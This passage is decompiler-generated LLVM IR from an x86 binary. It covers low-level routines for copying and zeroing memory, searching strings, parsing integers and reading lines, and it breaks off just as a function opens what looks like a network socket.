  %v2_8051c41 = phi i32 [ %v2_8051c41.pre, %dec_label_pc_8051c3f.loopexit ], [ %v0_8051c11, %dec_label_pc_8051c28 ]
  %v0_8051c3f = phi i32 [ %v0_8051c3f.pre, %dec_label_pc_8051c3f.loopexit ], [ %v1_8051c21, %dec_label_pc_8051c28 ]
  store i32 %v0_8051c3f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051c41, i32* @ebx, align 4
  ret i32 %v0_8051c3f

dec_label_pc_8051c44:                             ; preds = %dec_label_pc_8051c10
  store i32 %v4_8051c16, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c33

; uselistorder directives
  uselistorder i32 %v0_8051c3f, { 1, 0 }
  uselistorder i32 %v1_8051c39, { 1, 0 }
  uselistorder i32 %v1_8051c38, { 1, 0 }
  uselistorder i32 %v1_8051c21, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8051c16, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8051c33, { 0, 2, 1 }
}

define i32 @function_8051c50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051c50:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051c51 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c51, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8051c5e = icmp eq i32 %arg3, 0
  br i1 %v1_8051c5e, label %dec_label_pc_8051c6f, label %dec_label_pc_8051c62

dec_label_pc_8051c62:                             ; preds = %dec_label_pc_8051c50
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_8051c6411 = inttoptr i32 %arg2 to i8*
  %v4_8051c6412 = load i8, i8* %v3_8051c6411, align 1
  %v6_8051c6714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_8051c6412, i8* %v6_8051c6714, align 1
  %v0_8051c6a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c6a16 = add i32 %v0_8051c6a15, 1
  store i32 %v1_8051c6a16, i32* %edx.global-to-local, align 4
  %v12_8051c6b17 = icmp eq i32 %v1_8051c6a16, %arg3
  %v1_8051c6d18 = icmp eq i1 %v12_8051c6b17, false
  br i1 %v1_8051c6d18, label %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge, label %dec_label_pc_8051c6f.loopexit

dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge: ; preds = %dec_label_pc_8051c62, %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge
  %v1_8051c6a20 = phi i32 [ %v1_8051c6a, %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge ], [ %v1_8051c6a16, %dec_label_pc_8051c62 ]
  %v1_8051c64.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051c67.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051c64 = add i32 %v1_8051c6a20, %v1_8051c64.pre
  %v3_8051c64 = inttoptr i32 %v2_8051c64 to i8*
  %v4_8051c64 = load i8, i8* %v3_8051c64, align 1
  %v5_8051c67 = add i32 %v1_8051c6a20, %v4_8051c67.pre
  %v6_8051c67 = inttoptr i32 %v5_8051c67 to i8*
  store i8 %v4_8051c64, i8* %v6_8051c67, align 1
  %v0_8051c6a = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c6a = add i32 %v0_8051c6a, 1
  store i32 %v1_8051c6a, i32* %edx.global-to-local, align 4
  %v12_8051c6b = icmp eq i32 %v1_8051c6a, %arg3
  %v1_8051c6d = icmp eq i1 %v12_8051c6b, false
  br i1 %v1_8051c6d, label %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge, label %dec_label_pc_8051c6f.loopexit

dec_label_pc_8051c6f.loopexit:                    ; preds = %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge, %dec_label_pc_8051c62
  %v4_8051c64.lcssa = phi i8 [ %v4_8051c6412, %dec_label_pc_8051c62 ], [ %v4_8051c64, %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge ]
  %phitmp = sext i8 %v4_8051c64.lcssa to i32
  %v2_8051c6f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051c6f

dec_label_pc_8051c6f:                             ; preds = %dec_label_pc_8051c6f.loopexit, %dec_label_pc_8051c50
  %v2_8051c6f = phi i32 [ %v0_8051c51, %dec_label_pc_8051c50 ], [ %v2_8051c6f.pre, %dec_label_pc_8051c6f.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8051c50 ], [ %phitmp, %dec_label_pc_8051c6f.loopexit ]
  store i32 %v2_8051c6f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_8051c6a, { 1, 2, 0 }
  uselistorder i32 %v1_8051c6a20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051c64.dec_label_pc_8051c64_crit_edge, { 1, 0 }
}

define i32 @function_8051c80(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051c80:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8051c88 = icmp eq i32 %arg2, 0
  br i1 %v1_8051c88, label %dec_label_pc_8051c80.dec_label_pc_8051c99_crit_edge, label %dec_label_pc_8051c8c

dec_label_pc_8051c80.dec_label_pc_8051c99_crit_edge: ; preds = %dec_label_pc_8051c80
  %v0_8051c99.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051c99

dec_label_pc_8051c8c:                             ; preds = %dec_label_pc_8051c80
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8051c905 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_8051c905, align 1
  %v0_8051c946 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c947 = add i32 %v0_8051c946, 1
  store i32 %v1_8051c947, i32* %eax.global-to-local, align 4
  %v12_8051c958 = icmp eq i32 %v1_8051c947, %arg2
  %v1_8051c979 = icmp eq i1 %v12_8051c958, false
  br i1 %v1_8051c979, label %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge, label %dec_label_pc_8051c99

dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge: ; preds = %dec_label_pc_8051c8c, %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge
  %v1_8051c9410 = phi i32 [ %v1_8051c94, %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge ], [ %v1_8051c947, %dec_label_pc_8051c8c ]
  %v1_8051c90.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051c90 = add i32 %v1_8051c9410, %v1_8051c90.pre
  %v3_8051c90 = inttoptr i32 %v2_8051c90 to i8*
  store i8 0, i8* %v3_8051c90, align 1
  %v0_8051c94 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c94 = add i32 %v0_8051c94, 1
  store i32 %v1_8051c94, i32* %eax.global-to-local, align 4
  %v12_8051c95 = icmp eq i32 %v1_8051c94, %arg2
  %v1_8051c97 = icmp eq i1 %v12_8051c95, false
  br i1 %v1_8051c97, label %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge, label %dec_label_pc_8051c99

dec_label_pc_8051c99:                             ; preds = %dec_label_pc_8051c8c, %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge, %dec_label_pc_8051c80.dec_label_pc_8051c99_crit_edge
  %v0_8051c99 = phi i32 [ %v0_8051c99.pre, %dec_label_pc_8051c80.dec_label_pc_8051c99_crit_edge ], [ %v1_8051c947, %dec_label_pc_8051c8c ], [ %v1_8051c94, %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge ]
  ret i32 %v0_8051c99

; uselistorder directives
  uselistorder i32 %v1_8051c94, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051c99, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051c90.dec_label_pc_8051c90_crit_edge, { 1, 0 }
}

define i32 @function_8051ca0() local_unnamed_addr {
dec_label_pc_8051ca0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_8051cb5 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_8051cb5, label %dec_label_pc_8051cb7, label %dec_label_pc_8051cc0

dec_label_pc_8051cb7:                             ; preds = %dec_label_pc_8051cd2, %dec_label_pc_8051ca0, %dec_label_pc_8051cc0
  br label %dec_label_pc_8051cba

dec_label_pc_8051cba:                             ; preds = %dec_label_pc_8051ce5, %dec_label_pc_8051cb7
  %storemerge = phi i32 [ -1, %dec_label_pc_8051cb7 ], [ %v0_8051cd3, %dec_label_pc_8051ce5 ]
  ret i32 %storemerge

dec_label_pc_8051cc0:                             ; preds = %dec_label_pc_8051ca0
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_8051cb7, label %dec_label_pc_8051cc4

dec_label_pc_8051cc4:                             ; preds = %dec_label_pc_8051cc0
  %v2_8051cdc = add i32 %tmp, -1
  br label %dec_label_pc_8051cd8

dec_label_pc_8051cd0:                             ; preds = %dec_label_pc_8051cd8
  br label %dec_label_pc_8051cd2

dec_label_pc_8051cd2:                             ; preds = %dec_label_pc_8051ce5, %dec_label_pc_8051cd0
  %v2_8051ce03 = phi i32 [ %v1_8051ce5, %dec_label_pc_8051ce5 ], [ 0, %dec_label_pc_8051cd0 ]
  %v1_8051cd2 = add i32 %v0_8051cd2, 1
  %v1_8051cd3 = add i32 %v0_8051cd3, 1
  %v12_8051cd4 = icmp eq i32 %tmp10, %v1_8051cd2
  br i1 %v12_8051cd4, label %dec_label_pc_8051cb7, label %dec_label_pc_8051cd8

dec_label_pc_8051cd8:                             ; preds = %dec_label_pc_8051cd2, %dec_label_pc_8051cc4
  %v0_8051cd2 = phi i32 [ %v1_8051cd2, %dec_label_pc_8051cd2 ], [ 0, %dec_label_pc_8051cc4 ]
  %v0_8051ce5 = phi i32 [ %v2_8051ce03, %dec_label_pc_8051cd2 ], [ 0, %dec_label_pc_8051cc4 ]
  %v0_8051cd3 = phi i32 [ %v1_8051cd3, %dec_label_pc_8051cd2 ], [ 1, %dec_label_pc_8051cc4 ]
  %v3_8051cdc = add i32 %v2_8051cdc, %v0_8051cd3
  %v4_8051cdc = inttoptr i32 %v3_8051cdc to i8*
  %v5_8051cdc = load i8, i8* %v4_8051cdc, align 1
  %v4_8051ce0 = add i32 %v0_8051ce5, %tmp8
  %v5_8051ce0 = inttoptr i32 %v4_8051ce0 to i8*
  %v6_8051ce0 = load i8, i8* %v5_8051ce0, align 1
  %v17_8051ce0 = icmp eq i8 %v5_8051cdc, %v6_8051ce0
  %v1_8051ce3 = icmp eq i1 %v17_8051ce0, false
  br i1 %v1_8051ce3, label %dec_label_pc_8051cd0, label %dec_label_pc_8051ce5

dec_label_pc_8051ce5:                             ; preds = %dec_label_pc_8051cd8
  %v1_8051ce5 = add i32 %v0_8051ce5, 1
  %v12_8051ce6 = icmp eq i32 %tmp9, %v1_8051ce5
  %v1_8051ce8 = icmp eq i1 %v12_8051ce6, false
  br i1 %v1_8051ce8, label %dec_label_pc_8051cd2, label %dec_label_pc_8051cba

; uselistorder directives
  uselistorder i32 %v0_8051cd3, { 2, 0, 1 }
  uselistorder i32 %v0_8051ce5, { 1, 0 }
  uselistorder i32 %v1_8051cd2, { 1, 0 }
  uselistorder label %dec_label_pc_8051cb7, { 0, 2, 1 }
}

define i32 @function_8051cf0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051cf0:
  %v4_8051cf7 = ptrtoint i8* %arg1 to i32
  %v4_8051d00.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051d00

dec_label_pc_8051d00:                             ; preds = %dec_label_pc_8051d14, %dec_label_pc_8051d10, %dec_label_pc_8051d00, %dec_label_pc_8051cf0
  %v4_8051d00 = phi i32 [ %v4_8051d00.pre, %dec_label_pc_8051cf0 ], [ %v6_8051d00, %dec_label_pc_8051d00 ], [ %v6_8051d00, %dec_label_pc_8051d10 ], [ %v6_8051d00, %dec_label_pc_8051d14 ]
  %v0_8051d02 = phi i32 [ %v4_8051cf7, %dec_label_pc_8051cf0 ], [ %v1_8051d02, %dec_label_pc_8051d00 ], [ %v1_8051d02, %dec_label_pc_8051d10 ], [ %v1_8051d02, %dec_label_pc_8051d14 ]
  %v1_8051d00 = inttoptr i32 %v0_8051d02 to i8*
  %v2_8051d00 = load i8, i8* %v1_8051d00, align 1
  %v3_8051d00 = zext i8 %v2_8051d00 to i32
  %v5_8051d00 = and i32 %v4_8051d00, -256
  %v6_8051d00 = or i32 %v3_8051d00, %v5_8051d00
  %v1_8051d02 = add i32 %v0_8051d02, 1
  %v7_8051d0c = icmp eq i8 %v2_8051d00, 32
  br i1 %v7_8051d0c, label %dec_label_pc_8051d00, label %dec_label_pc_8051d10

dec_label_pc_8051d10:                             ; preds = %dec_label_pc_8051d00
  %v10_8051d10 = icmp eq i8 %v2_8051d00, 9
  br i1 %v10_8051d10, label %dec_label_pc_8051d00, label %dec_label_pc_8051d14

dec_label_pc_8051d14:                             ; preds = %dec_label_pc_8051d10
  %v10_8051d14 = icmp eq i8 %v2_8051d00, 10
  br i1 %v10_8051d14, label %dec_label_pc_8051d00, label %dec_label_pc_8051d18

dec_label_pc_8051d18:                             ; preds = %dec_label_pc_8051d14
  %tmp41 = sext i32 %arg2 to i64
  %v10_8051d18 = icmp eq i8 %v2_8051d00, 45
  br i1 %v10_8051d18, label %dec_label_pc_8051dcd, label %dec_label_pc_8051d21

dec_label_pc_8051d21:                             ; preds = %dec_label_pc_8051d18
  %v10_8051d21 = icmp eq i8 %v2_8051d00, 43
  br i1 %v10_8051d21, label %dec_label_pc_8051dfd, label %dec_label_pc_8051d2a

dec_label_pc_8051d2a:                             ; preds = %dec_label_pc_8051d21, %dec_label_pc_8051dfd
  %v0_8051d7430 = phi i32 [ %v1_8051d02, %dec_label_pc_8051d21 ], [ %v1_8051e00, %dec_label_pc_8051dfd ]
  %v0_8051da016.in = phi i8 [ %v2_8051d00, %dec_label_pc_8051d21 ], [ %v2_8051dfd, %dec_label_pc_8051dfd ]
  %v2_8051d7e9 = phi i8 [ %v2_8051d00, %dec_label_pc_8051d21 ], [ %v2_8051dfd, %dec_label_pc_8051dfd ]
  br label %dec_label_pc_8051d37

dec_label_pc_8051d37:                             ; preds = %dec_label_pc_8051dcd, %dec_label_pc_8051d2a
  %v0_8051d7429 = phi i32 [ %v1_8051dd5, %dec_label_pc_8051dcd ], [ %v0_8051d7430, %dec_label_pc_8051d2a ]
  %v0_8051da015.in = phi i8 [ %v2_8051dcd, %dec_label_pc_8051dcd ], [ %v0_8051da016.in, %dec_label_pc_8051d2a ]
  %v2_8051d7e8 = phi i8 [ %v2_8051dcd, %dec_label_pc_8051dcd ], [ %v2_8051d7e9, %dec_label_pc_8051d2a ]
  %v0_8051d37 = phi i64 [ 2147483648, %dec_label_pc_8051dcd ], [ 2147483647, %dec_label_pc_8051d2a ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_8051dcd ], [ 0, %dec_label_pc_8051d2a ]
  %v12_8051d3b = udiv i64 %v0_8051d37, %tmp41
  %v13_8051d3b = trunc i64 %v12_8051d3b to i32
  %v14_8051d3b = urem i64 %v0_8051d37, %tmp41
  %v15_8051d3b = trunc i64 %v14_8051d3b to i32
  br label %dec_label_pc_8051d7e

dec_label_pc_8051d50:                             ; preds = %dec_label_pc_8051d7e
  %v1_8051d50 = add nsw i32 %v0_8051d50, -48
  %v7_8051d57 = icmp slt i32 %v1_8051d50, %arg2
  br i1 %v7_8051d57, label %dec_label_pc_8051d59, label %dec_label_pc_8051daa

dec_label_pc_8051d59:                             ; preds = %dec_label_pc_8051d50, %dec_label_pc_8051da0
  %v1_8051d71 = phi i32 [ %v1_8051d50, %dec_label_pc_8051d50 ], [ %v2_8051da2, %dec_label_pc_8051da0 ]
  %v2_8051d59 = icmp slt i32 %v0_8051d59, 0
  br i1 %v2_8051d59, label %dec_label_pc_8051dc8, label %dec_label_pc_8051d5d

dec_label_pc_8051d5d:                             ; preds = %dec_label_pc_8051d59
  %tmp42 = icmp ugt i32 %v0_8051d5d, %v13_8051d3b
  br i1 %tmp42, label %dec_label_pc_8051dc8, label %dec_label_pc_8051d63

dec_label_pc_8051d63:                             ; preds = %dec_label_pc_8051d5d
  %v15_8051d5d = icmp eq i32 %v0_8051d5d, %v13_8051d3b
  br i1 %v15_8051d5d, label %dec_label_pc_8051dc2, label %dec_label_pc_8051d65

dec_label_pc_8051d65:                             ; preds = %dec_label_pc_8051dc2, %dec_label_pc_8051d63
  %v4_8051d6e = mul i32 %v1_8051d6e, %arg2
  %v2_8051d71 = add i32 %v1_8051d71, %v4_8051d6e
  br label %dec_label_pc_8051d74

dec_label_pc_8051d74:                             ; preds = %dec_label_pc_8051dc8, %dec_label_pc_8051d65
  %v1_8051d6e26 = phi i32 [ %v1_8051d6e, %dec_label_pc_8051dc8 ], [ %v2_8051d71, %dec_label_pc_8051d65 ]
  %v0_8051db220 = phi i32 [ %v0_8051d5d, %dec_label_pc_8051dc8 ], [ %v2_8051d71, %dec_label_pc_8051d65 ]
  %v0_8051daa19 = phi i32 [ -1, %dec_label_pc_8051dc8 ], [ 1, %dec_label_pc_8051d65 ]
  %v1_8051d74 = inttoptr i32 %v0_8051d74 to i8*
  %v2_8051d74 = load i8, i8* %v1_8051d74, align 1
  %v1_8051d7a = add i32 %v0_8051d74, 1
  br label %dec_label_pc_8051d7e

dec_label_pc_8051d7e:                             ; preds = %dec_label_pc_8051d37, %dec_label_pc_8051d74
  %v0_8051d74 = phi i32 [ %v0_8051d7429, %dec_label_pc_8051d37 ], [ %v1_8051d7a, %dec_label_pc_8051d74 ]
  %v1_8051d6e = phi i32 [ 0, %dec_label_pc_8051d37 ], [ %v1_8051d6e26, %dec_label_pc_8051d74 ]
  %v0_8051d5d = phi i32 [ 0, %dec_label_pc_8051d37 ], [ %v0_8051db220, %dec_label_pc_8051d74 ]
  %v0_8051d59 = phi i32 [ 0, %dec_label_pc_8051d37 ], [ %v0_8051daa19, %dec_label_pc_8051d74 ]
  %v0_8051d50.in = phi i8 [ %v0_8051da015.in, %dec_label_pc_8051d37 ], [ %v2_8051d74, %dec_label_pc_8051d74 ]
  %v2_8051d7e = phi i8 [ %v2_8051d7e8, %dec_label_pc_8051d37 ], [ %v2_8051d74, %dec_label_pc_8051d74 ]
  %v0_8051d50 = sext i8 %v0_8051d50.in to i32
  %v1_8051d81 = add i8 %v2_8051d7e, -48
  %tmp43 = icmp ult i8 %v1_8051d81, 10
  br i1 %tmp43, label %dec_label_pc_8051d50, label %dec_label_pc_8051d88

dec_label_pc_8051d88:                             ; preds = %dec_label_pc_8051d7e
  %v1_8051d88 = add i8 %v2_8051d7e, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_8051d88, 26
  br i1 %tmp44, label %dec_label_pc_8051da0, label %dec_label_pc_8051d94

dec_label_pc_8051d94:                             ; preds = %dec_label_pc_8051d88
  %v1_8051d94 = add i8 %v2_8051d7e, -97
  %tmp45 = icmp ult i8 %v1_8051d94, 26
  br i1 %tmp45, label %dec_label_pc_8051d9b, label %dec_label_pc_8051daa

dec_label_pc_8051d9b:                             ; preds = %dec_label_pc_8051d94
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_8051da0

dec_label_pc_8051da0:                             ; preds = %dec_label_pc_8051d88, %dec_label_pc_8051d9b
  %v1_8051da2 = phi i32 [ 55, %dec_label_pc_8051d88 ], [ 87, %dec_label_pc_8051d9b ]
  %v2_8051da2 = sub nsw i32 %v0_8051d50, %v1_8051da2
  %v7_8051da8 = icmp slt i32 %v2_8051da2, %arg2
  br i1 %v7_8051da8, label %dec_label_pc_8051d59, label %dec_label_pc_8051daa

dec_label_pc_8051daa:                             ; preds = %dec_label_pc_8051d50, %dec_label_pc_8051d94, %dec_label_pc_8051da0
  %v2_8051daa = icmp slt i32 %v0_8051d59, 0
  br i1 %v2_8051daa, label %dec_label_pc_8051de9, label %dec_label_pc_8051dae

dec_label_pc_8051dae:                             ; preds = %dec_label_pc_8051daa
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_8051db4 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_8051db4, label %dec_label_pc_8051dba, label %dec_label_pc_8051db8

dec_label_pc_8051db8:                             ; preds = %dec_label_pc_8051dae
  %v1_8051db8 = sub i32 0, %v0_8051d5d
  br label %dec_label_pc_8051dba

dec_label_pc_8051dba:                             ; preds = %dec_label_pc_8051dae, %dec_label_pc_8051db8
  %v0_8051dc1 = phi i32 [ %v0_8051d5d, %dec_label_pc_8051dae ], [ %v1_8051db8, %dec_label_pc_8051db8 ]
  ret i32 %v0_8051dc1

dec_label_pc_8051dc2:                             ; preds = %dec_label_pc_8051d63
  %v5_8051dc2 = sub i32 %v1_8051d71, %v15_8051d3b
  %v11_8051dc2 = xor i32 %v1_8051d71, %v15_8051d3b
  %v12_8051dc2 = xor i32 %v5_8051dc2, %v1_8051d71
  %v13_8051dc2 = and i32 %v12_8051dc2, %v11_8051dc2
  %v14_8051dc2 = icmp slt i32 %v13_8051dc2, 0
  %v15_8051dc2 = icmp eq i32 %v5_8051dc2, 0
  %v16_8051dc2 = icmp slt i32 %v5_8051dc2, 0
  %v3_8051dc6 = icmp ne i1 %v16_8051dc2, %v14_8051dc2
  %v4_8051dc6 = or i1 %v15_8051dc2, %v3_8051dc6
  br i1 %v4_8051dc6, label %dec_label_pc_8051d65, label %dec_label_pc_8051dc8

dec_label_pc_8051dc8:                             ; preds = %dec_label_pc_8051d5d, %dec_label_pc_8051dc2, %dec_label_pc_8051d59
  br label %dec_label_pc_8051d74

dec_label_pc_8051dcd:                             ; preds = %dec_label_pc_8051d18
  %v1_8051dcd = inttoptr i32 %v1_8051d02 to i8*
  %v2_8051dcd = load i8, i8* %v1_8051dcd, align 1
  %v1_8051dd5 = add i32 %v0_8051d02, 2
  br label %dec_label_pc_8051d37

dec_label_pc_8051de9:                             ; preds = %dec_label_pc_8051daa
  %v8_8051de9 = icmp eq i32 %stack_var_-20.0, 0
  %v2_8051dee = zext i1 %v8_8051de9 to i32
  %v1_8051df33 = or i32 %v2_8051dee, -2147483648
  ret i32 %v1_8051df33

dec_label_pc_8051dfd:                             ; preds = %dec_label_pc_8051d21
  %v1_8051dfd = inttoptr i32 %v1_8051d02 to i8*
  %v2_8051dfd = load i8, i8* %v1_8051dfd, align 1
  %v1_8051e00 = add i32 %v0_8051d02, 2
  br label %dec_label_pc_8051d2a

; uselistorder directives
  uselistorder i32 %v5_8051dc2, { 1, 2, 0 }
  uselistorder i32 %v2_8051da2, { 1, 0 }
  uselistorder i8 %v2_8051d74, { 1, 0 }
  uselistorder i32 %v2_8051d71, { 1, 0 }
  uselistorder i32 %v1_8051d71, { 0, 1, 3, 2 }
  uselistorder i32 %v13_8051d3b, { 1, 0 }
  uselistorder i32 %v1_8051d02, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_8051d00, { 2, 1, 0 }
  uselistorder i8 %v2_8051d00, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_8051d02, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051dc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051dba, { 1, 0 }
  uselistorder label %dec_label_pc_8051daa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051da0, { 1, 0 }
  uselistorder label %dec_label_pc_8051d7e, { 1, 0 }
  uselistorder label %dec_label_pc_8051d59, { 1, 0 }
  uselistorder label %dec_label_pc_8051d2a, { 1, 0 }
}

define i32 @function_8051e10(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051e10:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051e11 = load i32, i32* @edi, align 4
  %v0_8051e13 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8051e25.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051e25

dec_label_pc_8051e25:                             ; preds = %dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge, %dec_label_pc_8051e10
  %v0_8051e2c = phi i32 [ %v0_8051e2c.pre, %dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge ], [ %arg3, %dec_label_pc_8051e10 ]
  %v1_8051e26 = phi i32 [ %v1_8051e38, %dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge ], [ 0, %dec_label_pc_8051e10 ]
  %v0_8051e26 = phi i32 [ %v1_8051e3d, %dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge ], [ %arg1, %dec_label_pc_8051e10 ]
  %v0_8051e25 = phi i32 [ %v1_8051e35, %dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge ], [ %v0_8051e25.pre, %dec_label_pc_8051e10 ]
  %v2_8051e26 = add i32 %v0_8051e26, %v1_8051e26
  %v4_8051e2d = inttoptr i32 %v2_8051e26 to i32*
  %v5_8051e2d = call i32 @function_805232c(i32 %v0_8051e2c, i32* %v4_8051e2d, i32 1, i32 %v0_8051e25)
  %v1_8051e35 = add i32 %v5_8051e2d, -1
  %v8_8051e35 = icmp eq i32 %v1_8051e35, 0
  %v1_8051e36 = icmp eq i1 %v8_8051e35, false
  %v0_8051e44.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8051e36, label %dec_label_pc_8051e44, label %dec_label_pc_8051e38

dec_label_pc_8051e38:                             ; preds = %dec_label_pc_8051e25
  %v1_8051e38 = add i32 %v0_8051e44.pre, 1
  store i32 %v1_8051e38, i32* @ebx, align 4
  %v0_8051e39 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8051e3b = icmp sgt i32 %v0_8051e39, %v1_8051e38
  br i1 %v7_8051e3b, label %dec_label_pc_8051e3d, label %dec_label_pc_8051e44

dec_label_pc_8051e3d:                             ; preds = %dec_label_pc_8051e38
  %v1_8051e3d = load i32, i32* %esi.global-to-local, align 4
  %v3_8051e3d = add i32 %v1_8051e3d, %v0_8051e44.pre
  %v4_8051e3d = inttoptr i32 %v3_8051e3d to i8*
  %v5_8051e3d = load i8, i8* %v4_8051e3d, align 1
  %v14_8051e3d = icmp eq i8 %v5_8051e3d, 10
  %v1_8051e42 = icmp eq i1 %v14_8051e3d, false
  br i1 %v1_8051e42, label %dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge, label %dec_label_pc_8051e44

dec_label_pc_8051e3d.dec_label_pc_8051e25_crit_edge: ; preds = %dec_label_pc_8051e3d
  %v0_8051e2c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051e25

dec_label_pc_8051e44:                             ; preds = %dec_label_pc_8051e25, %dec_label_pc_8051e38, %dec_label_pc_8051e3d
  %v0_8051e44 = phi i32 [ %v1_8051e38, %dec_label_pc_8051e38 ], [ %v1_8051e38, %dec_label_pc_8051e3d ], [ %v0_8051e44.pre, %dec_label_pc_8051e25 ]
  %v1_8051e44 = icmp eq i32 %v0_8051e44, 0
  %v1_8051e46 = icmp eq i1 %v1_8051e44, false
  %v0_8051e53 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051e53 = select i1 %v1_8051e46, i32 %v0_8051e53, i32 0
  store i32 %v0_8051e13, i32* @ebx, align 4
  store i32 %v0_8051e11, i32* @edi, align 4
  ret i32 %v2_8051e53

; uselistorder directives
  uselistorder i32 %v1_8051e38, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051e44.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051e35, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_805232c, { 1, 0 }
  uselistorder label %dec_label_pc_8051e44, { 2, 1, 0 }
}

define i32 @function_8051e60() local_unnamed_addr {
dec_label_pc_8051e60:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_8051e6d = call i32 @function_80526c9(i32 16)
  %v1_8051e72 = inttoptr i32 %v1_8051e6d to i32*
  store i32 0, i32* %v1_8051e72, align 4
  %v3_8051e7f = call i32 @function_8052985(i32 2, i32 2, i32 0)
  store i32 %v3_8051e7f, i32* %esi.global-to-local, align 4
  %v10_8051e8b = icmp eq i32 %v3_8051e7f, -1
  br i1 %v10_8051e8b, label %dec_label_pc_8051ed2, label %dec_label_pc_8051e90

